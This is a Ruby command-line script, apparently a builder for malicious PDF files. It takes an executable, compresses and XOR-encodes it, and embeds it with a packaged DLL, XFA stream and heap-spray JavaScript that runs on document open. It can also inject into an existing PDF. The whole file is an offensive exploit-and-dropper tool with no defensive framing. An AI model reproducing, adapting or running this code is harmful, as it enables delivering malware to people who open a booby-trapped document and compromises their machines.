re 'metasm'
require 'origami'
require 'base64'
require 'optparse'

CFG_PE_OFFSET 	= 0xc4b0
CFG_PE_MAX_SIZE	= 114688
CFG_L2P_SIGNATURE = "!H2bYm.Sw@"

$OPTIONS = {}
$PACKAGE = {}

class MyWinAPI < ::Metasm::WinAPI
	new_api_c <<EOS, 'ntdll'
#line #{__LINE__}

typedef char CHAR;
typedef unsigned char BYTE;
typedef unsigned short WORD, USHORT;
typedef unsigned int UINT;
typedef long LONG;
typedef unsigned long ULONG, DWORD, *LPDWORD;
typedef int BOOL;
typedef unsigned long long DWORD64, ULONGLONG;

typedef unsigned char *PUCHAR;
typedef unsigned long *PULONG;
typedef void *PVOID;

typedef LONG NTSTATUS;
	
NTSTATUS RtlDecompressBuffer(
  USHORT CompressionFormat,
  PUCHAR UncompressedBuffer,
  ULONG UncompressedBufferSize,
  PUCHAR CompressedBuffer,
  ULONG CompressedBufferSize,
  PULONG FinalUncompressedSize
);

NTSTATUS RtlCompressBuffer(
  USHORT CompressionFormatAndEngine,
  PUCHAR UncompressedBuffer,
  ULONG UncompressedBufferSize,
  PUCHAR CompressedBuffer,
  ULONG CompressedBufferSize,
  ULONG UncompressedChunkSize,
  PULONG FinalCompressedSize,
  PVOID WorkSpace
);

NTSTATUS RtlGetCompressionWorkSpaceSize(
  USHORT CompressionFormatAndEngine,
  PULONG CompressBufferWorkSpaceSize,
  PULONG CompressFragmentWorkSpaceSize
);

EOS
end

def lznt1_compress(buffer)
	buff_wp_size = "\x00" * 4
	frag_wp_size = "\x00" * 4
	
	MyWinAPI.rtlgetcompressionworkspacesize(2, buff_wp_size, frag_wp_size)
	
	buff_wp_size = buff_wp_size.unpack('V').first()
	frag_wp_size = frag_wp_size.unpack('V').first()
	
	size = 10 * 1024 * 1024
	buffer_comp = "\x00" * size
	size_comp = size
	size_final = "\x00" * 4
	workspace_buffer = "\x00" * (buff_wp_size + 1)
	
	MyWinAPI.rtlcompressbuffer(2, buffer, buffer.size, buffer_comp, size_comp, 4096, size_final, workspace_buffer)
	size_final = size_final.unpack('V').first()
	
	return buffer_comp[0, size_final]
end

def encode_payload(buffer)
	buffer = lznt1_compress(buffer)

	orig_key = key = 1 + rand(255)
	kii = 1 + rand(255)
	
	puts "[+] Encoding payload (key: #{key} kii: #{kii})"
	
	buffer = buffer.unpack('C*').map do |cb|
		cb = cb ^ key
		key = (key + kii) & 0xff
		
		cb
	end.pack('C*')
	
	opts_buffer = CFG_L2P_SIGNATURE
	opts_buffer << [buffer.size].pack('V')
	opts_buffer << [orig_key].pack('C')
	opts_buffer << [kii].pack('C')
	
	return (opts_buffer + buffer)
end

def build_payload(user_pe)
	puts "[+] Embedding user executable (size: #{user_pe.size})"
	
	if user_pe.size > CFG_PE_MAX_SIZE
		puts "[-] Payload executable too big, should be max #{CFG_PE_MAX_SIZE} bytes"
		exit(1)
	end
	
	user_pe << "\x00" * (CFG_PE_MAX_SIZE - user_pe.size)
	
	p_dll = $PACKAGE[:dll].dup
	p_dll[CFG_PE_OFFSET, CFG_PE_MAX_SIZE] = user_pe
	
	return encode_payload(p_dll)
end

def package_load()
	puts("[+] Loading package")
	
	pkg_data = File.binread(File.join(File.dirname(__FILE__), 'data', 'beast.pkg'))
	pkg_data = Marshal.load(Base64.decode64(pkg_data))
	
	unless pkg_data.is_a?(Hash)
		puts("[-] Invalid package")
		exit(1)
	end
	
	if pkg_data[:xfa].nil? or pkg_data[:js].nil? or pkg_data[:dll].nil?
		puts("[-] Corrupted package")
		exit(1)
	end
	
	$PACKAGE = pkg_data
end

def process_options()
	op = OptionParser.new do |opts|
		opts.banner = "Usage: #{$0} [options]"
		
		opts.on("-i", "--input [FILE]", "Input PDF. If provided, exploit will be injected into it (optional)") do |v|
			$OPTIONS[:input_pdf] = v.to_s
		end
		
		opts.on("-p", "--payload [FILE]", "PE executable to embed in the payload") do |v|
			$OPTIONS[:payload_exe] = v.to_s
		end
		
		opts.on("--low-mem", "Use Heap spray suitable for low memory environment") do
			$OPTIONS[:low_mem] = true
		end
		
		opts.on("-o", "--output [FILE]", "File path to write output PDF") do |v|
			$OPTIONS[:output] = v.to_s
		end
		
		opts.on("-h", "--help", "Show help") do |opts|
			puts op
			exit(0)
		end
	end
	
	if ARGV.empty?
		puts op
		exit(0)
	else
		op.parse!
	end
end

def package_build()
	if $OPTIONS[:input_pdf]
		pdf = Origami::PDF.read($OPTIONS[:input_pdf])
	else
		pdf = Origami::PDF.new
	end
	
	pdf.pages << (page = Origami::Page.new)
	
	pdf.Catalog.AcroForm = Origami::Dictionary.new unless pdf.Catalog.AcroForm.is_a?(Origami::Dictionary)
	pdf.Catalog.AcroForm[:XFA] = Origami::Stream.new($PACKAGE[:xfa])
	
	pdf.Catalog.ZZZ = Origami::Dictionary.new
	pdf.Catalog.ZZZ[:EEE] = Origami::Stream.new(build_payload(File.binread($OPTIONS[:payload_exe])))
	
	puts("[+] Using low memory spray") if $OPTIONS[:low_mem]
	
	pdf.onDocumentOpen(Origami::Action::JavaScript.new($OPTIONS[:low_mem] ? $PACKAGE[:js_low] : $PACKAGE[:js]))
	
	save_path = $OPTIONS[:output] || 'magic.pdf'
	puts("[+] Generating file: #{save_path}")
	
	pdf.save(save_path)
end

if __FILE__ == $0
	process_options()
	package_load()
	package_build()
end
